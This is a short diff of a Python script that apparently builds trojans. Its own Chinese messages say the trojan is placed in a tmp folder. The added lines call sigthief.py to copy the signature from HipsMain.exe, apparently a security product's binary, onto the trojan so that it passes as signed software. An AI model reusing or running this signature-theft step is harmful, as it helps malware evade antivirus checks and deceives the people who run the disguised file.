@@ -66,3 +66,8 @@ print(resp)
 time.sleep(0.5)
 print("——————————————删除成功——————————————")
 print("———————木马在tmp下名字加1.exe————————")
+
+print("添加签名")
+resp = os.system("cd .\\tool\qm && python sigthief.py -i HipsMain.exe -t ..\\..\\tmp\\1.exe -o ..\\..\\tmp\\1_qm.exe")
+print(resp)
+print("成功")
